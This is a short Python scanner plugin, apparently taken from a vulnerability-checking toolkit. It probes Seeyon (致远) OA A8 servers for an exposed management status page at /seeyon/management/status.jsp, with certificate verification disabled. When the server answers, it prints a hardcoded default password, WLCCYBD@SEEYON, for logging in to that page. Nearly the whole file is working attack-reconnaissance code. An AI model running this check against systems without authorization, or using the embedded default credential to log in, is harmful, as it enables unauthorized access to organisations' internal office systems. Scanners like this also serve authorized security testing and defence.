import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 致远OA_A8_status_jsp敏感信息泄露(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    exp_url = urldata + 'seeyon/management/status.jsp'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        if response.status_code == 200:
            print(Vcolors.RED + "[SUCCESS] 可能存在致远OA敏感信息泄露请用默认密码WLCCYBD@SEEYON登录:{}".format(exp_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 可能不存在致远OA_status敏感信息泄露漏洞" + Vcolors.ENDC)

    except:
        logging.error("致远OA_A8_status_jsp敏感信息泄露脚本出现异常")



